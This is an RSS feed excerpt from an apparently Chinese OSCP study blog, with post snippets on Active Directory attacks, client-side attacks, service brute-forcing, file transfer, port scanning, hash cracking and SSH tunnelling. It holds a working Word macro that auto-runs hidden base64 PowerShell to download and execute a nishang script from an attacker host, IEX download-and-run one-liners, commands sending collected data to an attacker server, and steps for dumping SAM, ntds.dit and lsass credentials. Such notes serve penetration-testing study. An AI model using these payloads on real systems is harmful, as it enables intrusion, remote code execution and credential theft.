      <description>&lt;h1 id=&#34;impacket-lookupsid&#34;&gt;impacket-lookupsid&lt;/h1&gt;
&lt;p&gt;可获取主机用户名：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;impacket-lookupsid svc_apache:&amp;#39;S@Ss!K@*t13&amp;#39;@&amp;#39;flight.htb&amp;#39;

筛选用户：
cat u|grep SidTypeUser|awk -F &amp;#39;\&amp;#39; &amp;#39;{ print $2 }&amp;#39;|awk -F &amp;#39; &amp;#39; &amp;#39;{ print $1 }&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;组合拳winpeassmimikatz信息检索linuxpeass枚举服务暴力破解&#34;&gt;组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解&lt;/h1&gt;
&lt;p&gt;同步ntp时间：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo ntpdate -s 10.10.10.24
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看是否在域内：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net time /do
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;一ntlm协议&#34;&gt;一、NTLM协议&lt;/h2&gt;
&lt;h3 id=&#34;1lm-hash算法&#34;&gt;1、LM hash算法&lt;/h3&gt;
&lt;p&gt;简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。&lt;/p&gt;
&lt;h3 id=&#34;2ntlm-hash算法&#34;&gt;2、NTLM hash算法&lt;/h3&gt;
&lt;p&gt;简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中&lt;/p&gt;
&lt;h3 id=&#34;3ntlm-协议认证&#34;&gt;3、NTLM 协议认证&lt;/h3&gt;
&lt;p&gt;简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。&lt;/p&gt;
&lt;p&gt;challenge值：
V1：8B
V2：16B
Net-Ntlm hash:
V1：DES加密算法
V2：HMAC-MD5加密算法&lt;/p&gt;
&lt;h3 id=&#34;4攻击方式&#34;&gt;4、攻击方式&lt;/h3&gt;
&lt;p&gt;基于以上特性，NTLM主要有三种攻击方式：
1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。
2、NET-NTLM Relay，发生在response中。
3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。&lt;/p&gt;
&lt;h2 id=&#34;二kerberos协议&#34;&gt;二、Kerberos协议&lt;/h2&gt;
&lt;h2 id=&#34;1基础&#34;&gt;1、基础&lt;/h2&gt;
&lt;p&gt;①客户端
②服务端，拥有唯一的SPN（服务主体名称）
③认证服务的KDC（密钥分发中心），服务账户为krbtgt。&lt;/p&gt;
&lt;p&gt;简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ&amp;amp;AS_REP和TGS_REQ&amp;amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。&lt;/p&gt;</description>
    </item>
    <item>
      <title>客户端攻击</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</guid>
      <description>&lt;h1 id=&#34;宏&#34;&gt;宏&lt;/h1&gt;
&lt;p&gt;后缀建议为doc或者docm&lt;/p&gt;
&lt;p&gt;宏攻击代码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
     Str = Str + &amp;#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY&amp;#34;
     Str = Str + &amp;#34;3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5&amp;#34;
     Str = Str + &amp;#34;nKGh0dHA6Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKC&amp;#34;
     Str = Str + &amp;#34;g==&amp;#34;

    CreateObject(&amp;#34;Wscript.Shell&amp;#34;).Run Str
End Sub
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;字符串base64编码内容：
配合nishang:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;iex(new-object net.webclient).downloadstring(&amp;#34;http://192.168.45.240/nishang.ps1&amp;#34;)

IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.240/nishang.ps1&amp;#39;)

echo &amp;#39;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.240/nishang.ps1&amp;#39;)
&amp;#39;|base64
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;py脚本分割：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;str = &amp;#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGh0dHA6
Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKCg==&amp;#34;

n = 50

for i in range(0, len(str), n):
	print(&amp;#34;Str = Str + &amp;#34; + &amp;#39;&amp;#34;&amp;#39; + str[i:i+n] + &amp;#39;&amp;#34;&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果base64不行，不如直接明文：&lt;/p&gt;</description>
    </item>
    <item>
      <title>常见服务</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</guid>
      <description>&lt;p&gt;渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：&lt;/p&gt;
&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;挂载：
sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage

showmount 
-d：仅显示已被NFS客户端加载的目录； 
-e：显示NFS服务器上所有的共享目录。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
&lt;h3 id=&#34;爆破&#34;&gt;爆破&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定

crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法

./cme -t 1 ssh hosts  -u use_user  -p pass 

hydra -L txt -P txt ip ssh 快
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;生成ssh公私钥&#34;&gt;生成ssh公私钥&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh-keygen -t rsa

上传文件名必须为：authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;连接问题&#34;&gt;连接问题&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vim ~/.ssh/config 
HostKeyAlgorithms +ssh-rsa 
PubkeyAcceptedKeyTypes +ssh-rsa
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ftp anonymous@ip

prompt off

切换传输模式： binary ascii
开关被动模式： passive

put 
get
mget
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;列出信息：
smbclient -L \\\\{TARGET_IP}\\ -U 用户名
连接：
smbclient //ip/目录

SMB扫描工具：
enum4linux -a -o ip 
挂载SMB：
mount -t cifs //&amp;lt;IP地址&amp;gt; 本地目录
sudo mount -t cifs -o username=&amp;#34;qiu&amp;#34;,password=&amp;#34;password&amp;#34; //192.168.5.103/qiu smb


匿名挂载：
sudo mount -t cifs -o rw,username=guest,password= &amp;#39;//10.10.10.103/Department Shares&amp;#39; smb

SMB罗列：
smbmap -r 目录 -H ip

批量下载不用确认：
prompt off


使用Kerberos协议登录smb:
在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：
python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168

完全限定域名获取方式：
https://github.com/CroweCybersecurity/ad-ldap-enum.git
python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 

或者使用get-tgt获取票据，然后修改环境变量：
sudo ntpdate -s 10.10.10.24

python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:&amp;#39;AbsoluteLDAP2022!&amp;#39; -dc-ip 10.10.11.181

export KRB5CCNAME=svc_smb.ccache



爆破：
hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enum4linux&#34;&gt;enum4linux&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;enum4linux -a -o www.harvard.edu
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;确定目录可写入：
先挂载在本地：&lt;/p&gt;</description>
    </item>
    <item>
      <title>文件传输</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</guid>
      <description>&lt;p&gt;1、kali web服务搭建&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;服务搭建： 
python2:python2 -m SimpleHTTPServer 
python3:python3 -m http.server 
php:php -S 0:80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、kali 开启python接收http服务，靶机上传&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
import sys
import signal
from threading import Thread
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler



class PUTHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers[&amp;#39;Content-Length&amp;#39;])
        content = self.rfile.read(length)
        self.send_response(200)
        with open(self.path[1:], &amp;#34;w&amp;#34;) as f:
            f.write(content)


def run_on(port):
    print(&amp;#34;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...&amp;#34;.format(sys.argv[1], port))
    server_address = (sys.argv[1], port)
    httpd = HTTPServer(server_address, PUTHandler)
    httpd.serve_forever()


if __name__ == &amp;#34;__main__&amp;#34;:
    if len(sys.argv) &amp;lt; 3:
        print(&amp;#34;Usage:\n\tpython {0} ip 1337&amp;#34;.format(sys.argv[0]))
        sys.exit(1)
    ports = [int(arg) for arg in sys.argv[2:]]
    try:
        for port_number in ports:
            server = Thread(target=run_on, args=[port_number])
            server.daemon = True # Do not make us wait for you to exit
        server.start()
        signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt
    except KeyboardInterrupt:
        print &amp;#34;\nPython HTTP PUT Server Stoped.&amp;#34;
        sys.exit(1)


kali开启：sudo python2 put.py ip 80
靶机上传: 
powershell 可能出错
curl --upload-file 20240128065938_BloodHound.zip http://10.10.16.4
wget --method=PUT --post-file=20240128065938_BloodHound.zip http://10.10.16.4/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3、nc文件传输&lt;/p&gt;</description>
    </item>
    <item>
      <title>端口扫描</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</guid>
      <description>&lt;p&gt;直连网络使用nmap进行扫描，非直连网络，先用Rustscan快速探测端口开放性，然后再搭建ligolo进行针对端口扫描，速度可以调到400-1000左右，测试顺利；&lt;/p&gt;
&lt;h2 id=&#34;列出存活主机&#34;&gt;列出存活主机：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap:

Linux用脚本，Windows用arp-scan.exe

nmap -sn 192.168.5.0/24  理论上-sn 会包含-PR
nmap -PR 192.168.5.0/24




Linux:
NET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP &amp;amp;&amp;gt; /dev/null`; then echo -e &amp;#34;$NET$IP is \033[31mup\033[0m&amp;#34; ; else echo -e &amp;#34;$NET$IP is \033[32mdown\033[0m&amp;#34;; fi ; done
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;端口扫描&#34;&gt;端口扫描：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap:
OSCP 网络不好，直连速度调1500，隧道速度调整为1000或者800，隧道情况下的扫描不可靠

sudo nmap -sT -p- -O -sV --min-rate 7000 -Pn 192.168.152.148 -oN tcp_nmap.txt
sudo nmap -sU --top-ports 20 ip -oN udp_nmap.txt


筛选为适合漏洞扫描的格式
grep open tcp_nmap.txt | awk -F &amp;#39;/&amp;#39; &amp;#39;{print $1}&amp;#39;| paste -sd &amp;#39;,&amp;#39;

sudo nmap -sC --script=vuln -p端口 ip -oN vuln.txt



Linux:
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2&amp;gt;&amp;amp;1; done | grep -v &amp;#34;Connection refused&amp;#34;


for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done


windows:
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nc&#34;&gt;NC：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp扫描：

nc -nvv -w 1 -z 192.168.50.152 3388-3390

UDP扫描：
nc -nv -u -z -w 1 192.168.50.149 120-123
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nmap-脚本&#34;&gt;nmap 脚本&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/share/nmap/scripts

grep Exploits /usr/share/nmap/scripts/*.nse
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;autorecon&#34;&gt;AutoRecon&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/Tib3rius/AutoRecon
扫描器，可自动调用

将要扫描的主机放到txt文件内：
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;powershell-不推荐垃圾&#34;&gt;powershell 不推荐，垃圾&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1



powershell.exe -nop -exec bypass -c &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://192.168.45.245:81/Invoke-Portscan.ps1&amp;#39;);Invoke-Portscan -Hosts 172.16.247.0/24 -T 4 -ports 1-10000 -ReadableOut cxk.txt&amp;#34;


端口范围：
-Ports 1-10000

网段扫描：
Invoke-Portscan -Hosts 192.168.1.1/24 -T 5 -TopPorts 25 -oA localnet


Invoke-Portscan -Hosts 172.16.244.0/24 -T 5 -ports 1-10000 -ReadableOut cxk.txt

[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)
    5 {$nHosts=30;  $Threads = 1000; $Timeout = 750  }
    4 {$nHosts=25;  $Threads = 1000; $Timeout = 1200 }
    3 {$nHosts=20;  $Threads = 100;  $Timeout = 2500 }
    2 {$nHosts=15;  $Threads = 32;   $Timeout = 3000 }
    1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }

加大强度，可能误报：
Invoke-Portscan -Hosts 172.16.244.0/24 -Threads 2000 -nHosts 40 -Timeout 500 -ports 1-10000 -ReadableOut cxk2.txt

ping扫描，建议APRscan

Invoke-Portscan -Hosts 172.16.244.0/24 -PingOnly -ReadableOut PingOnly.txt

从文件中读取IP：

Invoke-Portscan -HostFile hosts.txt -Threads 2000 -SkipDiscovery -nHosts 40 -Timeout 300 -ports 1-10000 -ReadableOut portscan.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;naabu-专注web&#34;&gt;naabu 专注web&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/projectdiscovery/naabu

naabu -rate 500 -c 10 -s connect -p - -host 10.X.X.X -proxy 127.0.0.1:1080

文件落地的情况下：
naabu.exe -p - -host 172.16.247.0/24 -o cxk.txt

参数详解：
https://zhuanlan.zhihu.com/p/678578276
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;极端情况下&#34;&gt;极端情况下：&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://mp.weixin.qq.com/s/7Wc6furXUHfBfDeO3Zf7Qw
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;arp-scan-windows&#34;&gt;ARP-scan-windows&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/QbsuranAlang/arp-scan-windows-
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;rustscan-不如nmap但是可以丢到目标主机执行&#34;&gt;Rustscan 不如nmap，但是可以丢到目标主机执行&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/RustScan/RustScan


使用方式：

rustscan.exe -a 10.10.136.140 -r 1-65535 &amp;gt; scan.txt

可能会卡住，但是多敲回车，主要是探测端口开放性，配合nmap做服务识别

nmap脚本会失效：
-- -sV -sT &amp;gt; scan.txt

限制速度：
--ulimit 1000
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;mascan&#34;&gt;mascan&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;官方
https://github.com/robertdavidgraham/masscan

第三方
https://github.com/zan8in/masscan

masscan.exe -p1-10000 172.16.234.0/24 --rate=5000 -oB scan.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;ports-列表目前来看是代理情况下的最优解配合ew&#34;&gt;PORTS 列表，目前来看是代理情况下的最优解，配合ew&lt;/h1&gt;
&lt;p&gt;域内渗透的常见端口，加快扫描速度：&lt;/p&gt;</description>
    </item>
    <item>
      <title>隐藏信息获取&amp;破解</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</guid>
      <description>&lt;p&gt;secret&lt;/p&gt;
&lt;h2 id=&#34;图片信息查看&#34;&gt;图片信息查看：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exiftool 查看图片基本信息 
命令：exiftool main.gif 

steghide是一个图片或者音频文件的隐写工具 
命令： 
查看图片信息：steghide info xxx.jpg 
提取文件：steghide extract -sf xxx 
如果遇到加密的，可以使用stegseek进行爆破，命令如下： 
stegseek xx.jpg 字典路径 -xf 保存目录
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;二进制文件&#34;&gt;二进制文件&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file命令可以查看文件类型

xxd 是一个16进制dump工具，可用于查看文件的16进制内容：
命令：
xxd -r -ps xxxx 

strings可用于查看文件可读字符串，pacp包也可以用这个查看 
命令：
strings xxx 

binwalk查看文件是否有捆绑 
命令：
binwalk xxx
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;破解压缩包密码&#34;&gt;破解压缩包密码：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;7z2john backup.7z &amp;gt; hash3 
john -wordlist=/usr/share/wordlists/rockyou.txt hash3

zip2john backup.zip &amp;gt; hashes 
john --wordlist=/usr/share/wordlists/rockyou.txt hashes

zip：

sudo hashcat -m 13600 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
13600
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;swp&#34;&gt;.swp:&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi/vim -r 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;破解hash&#34;&gt;破解hash&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;判断hash类型：
hashid 
hash-identifier

md5:
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt

其他类型的hash查询：
https://hashcat.net/wiki/doku.php?id=example_hashes

无线密码：
aircrack-ng -w /usr/share/wordlists xx.cap


shadow密码：
john shadow --format=crypt --wordlist=/usr/share/xxx

hashcat:
https://blog.csdn.net/m0_43406494/article/details/116736263

修改shadow的文件，包括前面的名字，和后面的很多::的内容

hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

查看爆破成功的密码：
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;密码生成&#34;&gt;密码生成&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Crunch工具的使用方法：
https://blog.csdn.net/qq_63844103/article/details/127979575
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ntlm-hash获取&#34;&gt;NTLM HASH获取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;获取备份：
reg save HKLM\sam sam.bak
reg save HKLM\system system.bak

或者：
C:\WIndows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

读取sam的hash:
samdump2 SYSTEM SAM

john破解nt hash
将上一步提取的hash保存为文件：
john --wordlist=/user/xxx hash.txt --format=nt
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;证书提取&#34;&gt;证书提取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;提取私钥
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
提取公钥
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

直接申请TGT：
gettgtpkinit.py

https://wadcoms.github.io/wadcoms/PKINIT-gettgtpkinit/

得提前配置kinit
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;gpp密码解密&#34;&gt;GPP密码解密&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;自动：
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


手动：
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;vnc解密&#34;&gt;VNC解密&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -n 加密密码，去掉： | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;提取宏文件&#34;&gt;提取宏文件&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;提取文件：
unzip Currency\ Volume\ Report.xlsm
宏文件通常为.bin结尾的哪个，使用strings读取即可
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;dump内存读取&#34;&gt;dump内存读取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip3 install pypykatz  
pypykatz lsa minidump lsass.DMP
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ntdsdit密码获取&#34;&gt;ntds.dit密码获取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;这个文件无法直接获取，正常情况下需要管理员权限，但是特殊情况下可以获取，比如BACKUP OPERATORS组用户：
参考：
https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801

这个文件需要配合system.hive文件进行破解，获取方法：
reg save HKLM\SYSTEM C:\system.hive


破解：
python3 secretsdump.py -ntds ~/Desktop/ntds.dit -system ~/Desktop/system.hiv LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;16进制转换成字符串&#34;&gt;16进制转换成字符串：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -n &amp;#39;6d2424716c5f53405f504073735730726421&amp;#39; | xxd -r -p
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;msg格式文件读取&#34;&gt;msg格式文件读取&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;转换格式为eml:
msgconvert *.msg
读取：
xdg-open xx.eml
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;hashcat&#34;&gt;hashcat&lt;/h1&gt;
&lt;p&gt;规则编写：&lt;/p&gt;</description>
    </item>
    <item>
      <title>隧道代理</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
      <description>&lt;h1 id=&#34;linux&#34;&gt;Linux&lt;/h1&gt;
&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
-N：仅实现端口转发功能，不登录ssh。 
-L：表示local，本地端口转发； 

知道目标主机的ssh账密的情况：

本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 

ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 

远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali

ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 

中间主机+远程端口+本地kali 远距离端口转发
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4


SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 

ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]

ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215




本机kali开放ssh，需要ssh版本7.6以上：
sudo systemctl restart ssh.service
ssh -N -R 9998 kali@192.168.5.66
socks隧道，kali的9998即代表远程主机的
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ssh-本地端口转发&#34;&gt;SSH 本地端口转发：&lt;/h2&gt;
&lt;p&gt;DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/oscp_img/Pasted%20image%2020240314213959.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
